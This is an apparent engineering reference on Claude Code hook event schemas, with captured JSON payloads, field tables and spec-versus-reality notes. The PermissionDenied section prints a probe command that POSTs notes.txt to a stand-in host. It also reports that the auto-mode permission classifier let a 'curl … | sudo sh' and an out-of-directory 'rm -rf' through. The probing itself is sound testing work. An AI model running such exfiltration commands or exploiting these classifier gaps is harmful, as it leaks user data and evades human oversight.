{"session_id":"0ef819b5-ed3a-47e0-a967-651766f112f6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-agents--y7kt13l/0ef819b5-ed3a-47e0-a967-651766f112f6.jsonl","cwd":"/tmp/shp-hooks-agents-_y7kt13l","prompt_id":"aee11f7f-c04f-40c4-a6d5-bc46d1170e1b","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"<task-notification>\n<task-id>af9f464d837cbc5c2</task-id>\n<tool-use-id>toolu_013K9z1stFBsEG5B5RySxQ9H</tool-use-id>\n<o..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `prompt` | string | always | user text; `/compact` etc. do not fire it; system-injected `<task-notification>…` | |
| `source` | enum | never observed | — | binary: `["user","sdk","system","loop_wakeup","schedule_wakeup","poll_event"]`, optional; absent even on the injected `<task-notification>` prompt |
| `session_title` | string | never observed | — | schema only |

**Variants and edge cases:**
- After a background subagent finishes, Claude Code injects a `<task-notification>` prompt that fires `UserPromptSubmit` with a new `prompt_id` and a second `Stop` (`docs/probes/2026-09-14-schemas/hooks/live/S18_agents_tasks/events.jsonl`).
- Exit-0 stdout of a UserPromptSubmit hook is added to the model context (R01: model quoted `PAPAYA` "from the `UserPromptSubmit hook success` message", `docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/stdout.jsonl`).

**Spec alignment:**
- spec line 882 (`brief` from `UserPromptSubmit`): partially aligned — the latest `prompt` can be a system `<task-notification>` block with no `source` to tell it apart (`docs/probes/2026-09-14-schemas/hooks/live/S18_agents_tasks/events.jsonl`); only the first prompt per session is a safe `brief`.

---

### UserPromptExpansion

- **Produced by:** Claude Code 2.1.270 (zod `Ole`)
- **Consumed by:** not consumed by the spec today; relevant to §8 line 882 (`brief` for slash-command sessions)
- **Probe:** `run_probes.py S12`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S12`
- **Status:** partially verified — `expansion_type:"slash_command"` live; `mcp_prompt` binary only

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S12_slash_command/events.jsonl`)

```json
{"session_id":"6c85dece-8494-4493-9bc0-7d75a093d5d9","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-slash--ul-amd7/6c85dece-8494-4493-9bc0-7d75a093d5d9.jsonl","cwd":"/tmp/shp-hooks-slash-_ul_amd7","prompt_id":"7b3886f4-517f-45fd-bfdd-268a25f946b7","permission_mode":"default","hook_event_name":"UserPromptExpansion","expansion_type":"slash_command","command_name":"shpecho","command_args":"EXPANDED","command_source":"projectSettings","prompt":"/shpecho EXPANDED"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `expansion_type` | enum | always | `slash_command` | binary: `slash_command`, `mcp_prompt` |
| `command_name` | string | always | `shpecho` | |
| `command_args` | string | always | `EXPANDED` | |
| `command_source` | string | always | `projectSettings` | optional in schema |
| `prompt` | string | always | `/shpecho EXPANDED` | the unexpanded input |

**Variants and edge cases:** fires before `UserPromptSubmit` for the same `prompt_id`.

**Spec alignment:** aligned (not referenced).

---

### PreToolUse

- **Produced by:** Claude Code 2.1.270 (zod `ble`)
- **Consumed by:** §8 line 916 (liveness); §8 heuristics 2 and 4 (tool ledger); M1, M2
- **Probe:** `run_probes.py S01 S09 S17 R01 R02`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S09_perm_deny_rule_bash_rm/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Agent","tool_input":{"description":"Run bash echo sub command","prompt":"Run the Bash command: echo sub. Then reply done.","subagent_type":"general-purpose","run_in_background":false},"tool_use_id":"toolu_01UyNmiq2fWehP4Jooar3YS7"}
{"session_id":"d2658749-e91b-4404-accc-2f2fd1db2c34","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-deny-rule-bash-rm-ldxzdbc6/d2658749-e91b-4404-accc-2f2fd1db2c34.jsonl","cwd":"/tmp/shp-hooks-perm-deny_rule_bash_rm-ldxzdbc6","prompt_id":"b38b8c5c-299d-4870-924a-b0684f3a91cb","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"rm -f ./nofile.txt","description":"Remove the file nofile.txt if it exists"},"tool_use_id":"toolu_011R3Q5t1LeLojde5w8uyG7j"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Bash`, `Write`, `Read`, `ToolSearch`, `TaskCreate`, `TaskUpdate`, `Agent`, `mcp__shpelicit__ask_name` | MCP tools as `mcp__<server>__<tool>` |
| `tool_input` | object | always | tool-specific, e.g. `{"command":…,"description":…}` | |
| `tool_use_id` | string | always | `toolu_…` | joins to PostToolUse / PostToolUseFailure / PermissionDenied / PostToolBatch |

**Variants and edge cases:**
- Fires **before** the permission decision: also for calls then refused by a deny rule (`--disallowedTools Bash(rm:*)`) or by `dontAsk` (S09).
- Matcher is the tool name (`hook_name` `PreToolUse:Bash`).

**Spec alignment:** aligned.

---

### PermissionRequest

- **Produced by:** Claude Code 2.1.270 (zod `Tle`)
- **Consumed by:** §8 line 883 and line 937 (`needs_you`), line 917; §7 `needs_you_reason` (line 677); §11 line 1684 (Needs-You rail); M1, M4
- **Probe:** `run_probes.py S01 S09` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S09 && python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PermissionRequest","tool_name":"Write","tool_input":{"file_path":"/tmp/shp-outside-shp-hooks-base-dwqg6d95.txt","content":"x"},"permission_suggestions":[{"type":"setMode","mode":"acceptEdits","destination":"session"},{"type":"addDirectories","directories":["/tmp"],"destination":"session"}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Write` (4), `Bash` (2) | |
| `tool_input` | object | always | | |
| `permission_suggestions` | array | always | `{"type":"setMode","mode":"acceptEdits","destination":"session"}`, `{"type":"addDirectories","directories":[…],"destination":"session"}` | optional in schema |
| `tool_use_id` | — | **never** | — | not in schema; join to PreToolUse by order/`tool_input` |

**Variants and edge cases:**
- `-p` default mode: fires, then the call is auto-refused with no further permission event; the only trace is `PostToolBatch.tool_calls[].tool_response` = `"Claude requested permissions to write to …, but you haven't granted it yet."` (`docs/probes/2026-09-14-schemas/hooks/live/S09_perm_default_write_outside/events.jsonl`). Same with `--permission-prompts none`.
- `dontAsk` mode and deny rules: **no** PermissionRequest (S09).
- TUI: `PermissionRequest` at 15:38:05.762, `Notification{permission_prompt}` 6.0 s later at 15:38:11.797; after the user rejected with Esc, **no** Stop, PostToolUseFailure or PermissionDenied followed — nothing until the next prompt (`docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`, `steps.txt`).

**Spec alignment:**
- spec line 937 ("or an unresolved `PermissionRequest`"): there is no resolution event for a human rejection in the TUI (I01) and none for the automatic refusal in `-p` (S09); "unresolved" can only be cleared by a later event from the same session (next `UserPromptSubmit`/`PreToolUse`/`Stop`).

---

### PermissionDenied

- **Produced by:** Claude Code 2.1.270 (zod `Cle`; dispatched only when `decisionReason.type==="classifier" && classifier==="auto-mode"`, `docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt` line 22)
- **Consumed by:** §8 line 917 (needs-you); M1
- **Probe:** `run_probes.py S09 S19 S20`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S20`
- **Status:** verified live 2026-09-14 (auto mode on sonnet; model-dependent)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S20_perm_auto_deny/events.jsonl`)

```json
{"session_id":"17120dd4-f47a-48cf-83ae-c0423a558b46","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-auto-deny-jc3ld08x/17120dd4-f47a-48cf-83ae-c0423a558b46.jsonl","cwd":"/tmp/shp-hooks-perm-auto-deny-jc3ld08x","prompt_id":"46703522-6a6f-47a1-ac80-2cffd2dc0402","permission_mode":"auto","effort":{"level":"high"},"hook_event_name":"PermissionDenied","tool_name":"Bash","tool_input":{"command":"curl -s --max-time 3 -X POST --data-binary @notes.txt https://upload.shp-probe.invalid/collect; echo \"exit_code=$?\"","description":"POST notes.txt to external review service"},"tool_use_id":"toolu_012xbjAJQKREKtxwJTMqozBS","reason":"[Data Exfiltration]"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Bash` | |
| `tool_input` | object | always | | |
| `tool_use_id` | string | always | | |
| `reason` | string | always | `[Data Exfiltration]` | classifier category |

**Variants and edge cases:**
- Not emitted for: `dontAsk` refusal, `--disallowedTools` deny rule, `-p` auto-refusal of a PermissionRequest, `--permission-prompts none`, a TUI Esc rejection (S09, I01).
- `--permission-mode auto` on haiku is silently downgraded (`docs/probes/2026-09-14-schemas/hooks/live/S09_perm_auto_mode_delete_outside/debug-extras.txt`: `auto mode disabled: model claude-haiku-4-5-20251001 does not support auto mode`; payload `permission_mode:"default"`).
- The auto classifier **allowed** `rm -rf <tmp dir outside cwd>` (S19, dir deleted) and `curl … | sudo sh` to a `.invalid` host (S20, ran and failed on DNS).

**Spec alignment:**
- spec line 917 lists PermissionDenied as a needs-you source; reality: it only fires for auto-mode classifier denials, so in `default`/`acceptEdits`/`dontAsk` sessions it never fires.

---

### PostToolUse

- **Produced by:** Claude Code 2.1.270 (zod `yle`)
- **Consumed by:** §8 line 916 (liveness), heuristics 2 and 4; §18 hook write-volume risk (line 2327); M1, M2
- **Probe:** `run_probes.py S01 S11 S17`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S17`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S17_elicitation/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_response":{"stdout":"hello","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT","duration_ms":49}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","permission_mode":"default","hook_event_name":"PostToolUse","tool_name":"mcp__shpelicit__ask_name","tool_input":{},"tool_response":[{"type":"text","text":"elicitation response: {\"action\": \"cancel\"}"}],"tool_use_id":"toolu_01EsGpL7uuSqWTHnAZeYDYz3","duration_ms":44}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` / `tool_input` / `tool_use_id` | | always | as PreToolUse | |
| `tool_response` | object or array | always | Bash `{stdout,stderr,interrupted,isImage,noOutputExpected[,backgroundTaskId]}`; MCP `[{"type":"text",…}]` | type varies by tool |
| `duration_ms` | int | always | `49`, `44` | optional in schema; excludes permission-prompt and hook time (schema description) |

**Variants and edge cases:** a background Bash call returns immediately with `tool_response.backgroundTaskId` (`docs/probes/2026-09-14-schemas/hooks/live/S11_background_task/events.jsonl`).

**Spec alignment:** aligned.

---

### PostToolUseFailure

- **Produced by:** Claude Code 2.1.270 (zod `Ale`)
- **Consumed by:** §8 line 916, heuristic 3 "failure tail" (last 3 signals `PostToolUseFailure` on the same tool); M2
- **Probe:** `run_probes.py S01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"Bash","tool_input":{"command":"false","description":"Run false command"},"tool_use_id":"toolu_013bWZG1PyuhUirXuYdNpLV5","error":"Exit code 1","is_interrupt":false,"duration_ms":10}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"Read","tool_input":{"file_path":"/tmp/shp-hooks-base-dwqg6d95/does-not-exist.txt"},"tool_use_id":"toolu_015PGr45dd1pTHmMSM9qUvqX","error":"File does not exist. Note: your current working directory is /tmp/shp-hooks-base-dwqg6d95.","is_interrupt":false,"duration_ms":6}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `error` | string | always | `Exit code 1`, `File does not exist. Note: …` | free text |
| `is_interrupt` | bool | always | `false` | optional in schema |
| `duration_ms` | int | always | `10`, `6` | optional in schema |
| `tool_name` / `tool_input` / `tool_use_id` | | always | | |

**Variants and edge cases:** a tool call refused by permissions (S09) or blocked by a PreToolUse exit 2 (R01) produces **no** PostToolUseFailure; only `PostToolBatch` records it.

**Spec alignment:** aligned for real tool errors; heuristic 3 will not see permission/hook refusals (they surface only in PostToolBatch).

---

### PostToolBatch

- **Produced by:** Claude Code 2.1.270 (zod `Rle`/`vle`)
- **Consumed by:** not subscribed in §8 (lines 912–923); relevant to heuristics 3 and 4
- **Probe:** `run_probes.py S01 S09 R01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S09 R01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S09_perm_dontAsk_write_outside/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolBatch","tool_calls":[{"tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT","tool_response":"hello"}]}
{"session_id":"5d1202ea-3765-459d-8299-8630c710c50d","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-dontAsk-write-outside-6d-5cdt1/5d1202ea-3765-459d-8299-8630c710c50d.jsonl","cwd":"/tmp/shp-hooks-perm-dontAsk_write_outside-6d_5cdt1","prompt_id":"8b1d20c8-b831-4270-a22c-3c54cfc88202","permission_mode":"dontAsk","hook_event_name":"PostToolBatch","tool_calls":[{"tool_name":"Write","tool_input":{"file_path":"/tmp/shp-hooks-victim-9zwf34kf/outside.txt","content":"x"},"tool_use_id":"toolu_012CQgKZPPKKLQx9nH3Qjkbi","tool_response":"Permission to use Write has been denied because Claude Code is running in don't ask mode. IMPORTANT: You *may* attempt t..."}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_calls` | array of `{tool_name, tool_input, tool_use_id, tool_response?}` | always | one entry per call in the batch | `tool_response` here is a **string** (the text the model saw), not the structured PostToolUse object |

**Variants and edge cases:** the only hook event that records permission refusals and hook blocks (`tool_response` = refusal text).

**Spec alignment:** not referenced by the spec; omission matters for heuristic 3 (see PostToolUseFailure).

---

### Stop

- **Produced by:** Claude Code 2.1.270 (zod `xle`, background task `Xz`, cron `Jz`)
- **Consumed by:** §8 lines 887, 918 (classification), lines 962–963, 976, 1025 (`Stop.stop_reason`), heuristic 2 (`last_assistant_message`); §9 mailbox delivery trigger (line 1181); Appendix A line 2531; D12, D24, D34; M2, M3
- **Probe:** `run_probes.py S01 S10 S11 S18` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S10 S11 S18`
- **Status:** partially verified — top-level fields live 2026-09-14 (26 captures). Never observed: `stop_hook_active:true`, a `session_crons` element (always `[]`), and `background_tasks` entries of any type except `shell` (so the `agent_type`/`server`/`tool`/`name` keys are schema only). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S11_background_task/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S10_effort_sonnet/events.jsonl`)

```json
{"session_id":"1352aae9-adfa-4f21-bf43-d66b81709640","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-bg-0dhnzsgh/1352aae9-adfa-4f21-bf43-d66b81709640.jsonl","cwd":"/tmp/shp-hooks-bg-0dhnzsgh","prompt_id":"35dc50eb-7f18-4848-8923-fc9a3eabcce0","permission_mode":"default","hook_event_name":"Stop","stop_hook_active":false,"last_assistant_message":"STARTED","background_tasks":[{"id":"bx4s43qvk","type":"shell","status":"running","description":"Background sleep and echo command","command":"sleep 25 && echo bgdone"}],"session_crons":[]}
{"session_id":"5c59934b-3bd1-43ab-9506-a6a16f581034","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl","cwd":"/tmp/shp-hooks-effort-7yb7myuc","prompt_id":"a95c9922-3b49-44f2-8906-ef313239b6c1","permission_mode":"default","effort":{"level":"low"},"hook_event_name":"Stop","stop_hook_active":false,"last_assistant_message":"DONE","background_tasks":[],"session_crons":[]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `stop_hook_active` | bool | always | `false` | |
| `last_assistant_message` | string | always | final assistant text | optional in schema |
| `background_tasks` | array of `{id,type,status,description,command?,agent_type?,server?,tool?,name?}` | always | `[]`; `[{"id":"bx4s43qvk","type":"shell","status":"running",…}]` | |
| `session_crons` | array of `{id,schedule,recurring,prompt}` | always | `[]` | |
| `stop_reason` | — | **never** | — | not in the schema and never observed |

**Variants and edge cases:**
- Fires once per turn, not once per session: S18 had two (`Stop`, then an injected `<task-notification>` `UserPromptSubmit`, then `Stop`).
- In `-p`, a turn that ends with a running background shell gets `Stop` and then the process kills the shell 5 s later with no `SessionEnd` (S11).
- A human rejection of a permission prompt in the TUI ends the turn with **no** Stop (I01).
- Hitting the output cap does not produce `Stop`; it produces `StopFailure{error:max_output_tokens}` (S08_mock_max_tokens).

**Spec alignment:**
- spec lines 962, 963, 976, 1025 and 2531 key rules on `Stop.stop_reason` (`max_tokens`, `tool_use`, `end_turn`); reality: `Stop` has no `stop_reason` field (26 captures; binary schema `xle`). Truncation arrives as `StopFailure.error = max_output_tokens`; `end_turn` vs `tool_use` must come from the transcript.
- spec line 1181 (mailbox delivers on `Stop`): aligned for normal turns; no Stop after a TUI permission rejection (I01).

---

### StopFailure

- **Produced by:** Claude Code 2.1.270 (zod `Ile`, error enum `o_`, dispatcher `pet()` in `docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt` line 18)
- **Consumed by:** §8 lines 887, 918, 951–971 (mechanical `stop_reason` table); §18 line 2330; D21, D24; M1, M2
- **Probe:** `run_probes.py S07 S08`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S07 S08`
- **Status:** partially verified — payload shape live 2026-09-14. Only `model_not_found` came from the real API. Seven more values were provoked by the real CLI against a local mock API (simulated HTTP errors). Five enum values were never observed: `oauth_org_not_allowed`, `account_on_hold`, `verification_required`, `overloaded`, `cloud_credential_error`. Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/events.jsonl` [real API]; `docs/probes/2026-09-14-schemas/hooks/live/S08_mock_prompt_too_long/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S08_mock_http529/events.jsonl` [mock API])

```json
{"session_id":"8fd6aa9e-7844-413d-950c-467608919cd5","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-badmodel-29lh7ct7/8fd6aa9e-7844-413d-950c-467608919cd5.jsonl","cwd":"/tmp/shp-hooks-badmodel-29lh7ct7","prompt_id":"dd06b403-5548-4081-b16c-4eb5e30cf88b","effort":{"level":"high"},"hook_event_name":"StopFailure","error":"model_not_found","last_assistant_message":"There's an issue with the selected model (claude-nonexistent-model-shp). It may not exist or you may not have access to ..."}
{"session_id":"817ffc30-1a65-48b1-9908-80b79e8a9204","transcript_path":"/tmp/shp-hooks-mock-prompt_too_long-e5we4qw3/cfg/projects/-tmp-shp-hooks-mock-prompt-too-long-e5we4qw3/817ffc3...","cwd":"/tmp/shp-hooks-mock-prompt_too_long-e5we4qw3","prompt_id":"1dc08d75-e877-47cc-aa79-25133a624f80","hook_event_name":"StopFailure","error":"invalid_request","error_details":"400 {\"type\":\"error\",\"error\":{\"type\":\"invalid_request_error\",\"message\":\"prompt is too long: 250000...","last_assistant_message":"Prompt is too long · the request is ~250000 tokens (limit 200000) but this conversation is only ~2157 tokens —..."}
{"session_id":"78743a17-9a6a-48d1-bf06-92bc067b750f","transcript_path":"/tmp/shp-hooks-mock-http529-rlkf4sfy/cfg/projects/-tmp-shp-hooks-mock-http529-rlkf4sfy/78743a17-9a6a-48d1-bf06-92bc067b7...","cwd":"/tmp/shp-hooks-mock-http529-rlkf4sfy","prompt_id":"4cfdecca-a0f9-4c9b-9221-b1204442fb98","hook_event_name":"StopFailure","error":"server_error","last_assistant_message":"API Error: 529 Overloaded. This is a server-side issue, usually temporary — try again in a moment. If it persists, check..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `error` | enum | always | `model_not_found`, `authentication_failed`, `billing_error`, `rate_limit`, `server_error`, `invalid_request`, `max_output_tokens`, `unknown` | see Enumerations for the full list and the stimulus→value map |
| `error_details` | string | sometimes (1/23) | raw API error body (`prompt_too_long`) | |
| `last_assistant_message` | string | always | the user-facing error text | |
| `permission_mode` | — | never | — | `pet()` passes `undefined` |
| `effort` | object | sometimes (13/23) | `{"level":"high"}` | present when the (claimed) model supports effort |

**Variants and edge cases:**
- **Delivery race in `-p`.** StopFailure is dispatched after shutdown has begun (`[uds-messaging] Shutting down` at 15:15:12.569 comes before the hook lines, `docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/debug-extras.txt`). In S07 the Python `docs/probes/2026-09-14-schemas/hooks/capture_env.py` hook `completed with status 1` and wrote nothing, while the fork-free bash capture `completed with status 0` (`docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/debug-hooklines.txt`). R04 showed the same thing: status 1, and its `env.jsonl` has only a SessionStart record. `docs/probes/2026-09-14-schemas/hooks/capture_env.py` catches `BaseException` and always exits 0, so status 1 with no output fits a process killed at exit. That cause is inferred; no signal was recorded. Observed 2/2 for StopFailure. A Python hook on a normal `-p` SessionEnd (S01) completed with status 0.
- Retries: the real 404 was tried streaming, then non-streaming, before StopFailure (two `API error (attempt 1/11)` lines in `docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/debug-extras.txt`); mock runs set `CLAUDE_CODE_MAX_RETRIES=0`.
- The matcher value is `error` (`StopFailure:model_not_found` in debug).

**Spec alignment:**
- spec lines 951, 956, 971 say `StopFailure` carries `error_type`; reality: the field is `error` (`docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/events.jsonl`).
- spec line 956 maps `overloaded` → `rate_limited`; reality: a 529 produced `error:"server_error"` ("The API is at capacity"/"529 Overloaded", `docs/probes/2026-09-14-schemas/hooks/live/S08_mock_http529`) and the binary contains 0 assignments of `error:"overloaded"` (`docs/probes/2026-09-14-schemas/hooks/binary/stopfailure-error-assignments.txt`). Would classify 529 as `server_error`, not `rate_limited`.
- spec line 960 maps `invalid_request` → `bad_request`; reality: a plain 400 produced `error:"unknown"` (`docs/probes/2026-09-14-schemas/hooks/live/S08_mock_http400`); only special 400s map to `invalid_request` (prompt too long) or `billing_error` (credit balance).
- spec lines 958–960 omit `verification_required` and `cloud_credential_error` (binary enum `o_`).
- spec line 962 `= max_output_tokens`: aligned (`docs/probes/2026-09-14-schemas/hooks/live/S08_mock_max_tokens`, mock).
- spec line 2330 ("documented, not observed"): now observed.

---

### SubagentStart

- **Produced by:** Claude Code 2.1.270 (zod `Dle`)
- **Consumed by:** §8 line 885 (`active_subagents`), line 919; §7 line 679; M1
- **Probe:** `run_probes.py S01 S18`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S18`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"SubagentStart"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `agent_id` | string | always | `a7154de3fc719065c` | also the id inside `<task-notification>` |
| `agent_type` | string | always | `general-purpose`, `shpprobe` | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** for an async-launched Agent call (`tool_response.status:"async_launched"`, S18) `SubagentStart` (15:23:44.780) and `PostToolUse{Agent}` (15:23:44.782) are 2 ms apart and their capture lines landed in the opposite order; do not rely on arrival order. The subagent's result later arrives as an injected `<task-notification>` prompt (see UserPromptSubmit).

**Spec alignment:** aligned in shape; see SubagentStop for the counter problem.

---

### SubagentStop

- **Produced by:** Claude Code 2.1.270 (zod `Nle`)
- **Consumed by:** §8 line 885 (`active_subagents`), line 919; §7 line 679; M1
- **Probe:** `run_probes.py S01 S05 S18` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S05`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S05_compact/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"SubagentStop","stop_hook_active":false,"agent_transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/subagents/agent-a7154de3fc71906...","last_assistant_message":"Done.","background_tasks":[],"session_crons":[]}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","permission_mode":"default","agent_id":"a76c715e3814aa492","agent_type":"","hook_event_name":"SubagentStop","stop_hook_active":false,"agent_transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/subagents/agent-a76c715e3814aa4...","last_assistant_message":"<analysis>\nThe conversation consists of a single, structured request from the user to execute a specific sequence of 7 ...","background_tasks":[],"session_crons":[]}
```

